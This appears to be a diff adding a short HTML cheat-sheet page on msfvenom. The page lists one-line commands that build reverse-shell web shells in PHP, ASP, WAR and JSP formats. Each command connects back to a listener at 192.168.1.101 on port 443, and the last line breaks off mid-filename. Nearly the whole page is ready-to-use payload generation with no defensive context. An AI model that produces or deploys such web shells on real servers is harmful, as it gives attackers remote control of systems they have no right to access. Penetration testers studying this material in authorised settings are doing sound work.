@@ -1,0 +1,20 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>MSFVenom</title>
+</head><body>MSFVenom can help here too. Again, be aware what is a meterpreter payload and what is not <br/>
+<br/>
+Web-shells - Platform Independent<br/>
+PHP<br/>
+This php-shell is OS-independent. You can use it on both Linux and Windows.<br/>
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw &gt; shell.php<br/>
+<br/>
+ASP<br/>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp &gt; shell.asp<br/>
+<br/>
+WAR<br/>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war &gt; shell.war<br/>
+<br/>
+JSP<br/>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw &gt; shell.j</body></html>
